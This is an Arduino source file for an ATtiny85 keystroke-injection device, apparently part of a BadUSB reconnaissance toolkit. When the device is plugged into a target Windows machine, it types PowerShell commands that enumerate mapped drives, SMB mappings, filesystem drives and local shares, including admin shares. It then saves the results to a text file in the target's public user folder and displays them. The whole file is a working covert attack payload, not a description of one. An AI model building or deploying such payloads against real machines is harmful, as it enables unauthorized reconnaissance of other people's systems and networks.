// recon/smb-shares - Tier 2
//
// Mapped drives and reachable file shares, including admin shares.
//
// (no notes)
//
// Read-only, no persistence, nothing left behind except the text file named in
// R_OUT. Output lands in C:\Users\Public\ds-recon\ on the target.

#include <duck.h>

// PROGMEM: this string must live in flash, not SRAM. The ATtiny85 has 512
// bytes of RAM and this script is far larger than that.
static const char S[] PROGMEM =
    R_MKDIR
    "'=== NET USE ==='"
    "net use 2>&1|Out-String"
    "'=== SMB MAPPINGS ==='"
    "Get-SmbMapping -EA 0|Select LocalPath,RemotePath,Status|Format-List"
    "'=== FILESYSTEM DRIVES ==='"
    "Get-PSDrive -PSProvider FileSystem|Select Name,Root,Used,Free,DisplayRoot|Format-List"
    "'=== LOCAL SHARES ==='"
    "Get-SmbShare -EA 0|Select Name,Path,Description,ShareState|Format-Table -Auto|Out-String -Width 200"
    R_OUT("smb-shares.txt")
    R_SHOW("smb-shares.txt");

void setup() {
  duckBegin();
  ledPulse(2, 120, 120);
  recon(S);
  ledPulse(4, 150, 150);
}

void loop() {}
